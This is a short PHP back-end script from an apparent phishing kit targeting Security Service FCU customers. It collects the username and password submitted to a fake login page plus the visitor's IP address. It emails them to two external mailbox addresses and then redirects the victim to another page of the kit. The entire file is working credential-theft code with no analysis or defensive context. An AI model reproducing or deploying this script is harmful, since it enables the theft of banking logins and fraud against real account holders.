<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "UserName           : ".$_POST['Username']."\n";
$message .= "Password            : ".$_POST['Password']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "hocraig@yandex.com, jimmyDavis121@outlook.com";
$subject = " Security Service FCU LOGINS 2020  | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  SSFCUINFO.htm");
?>


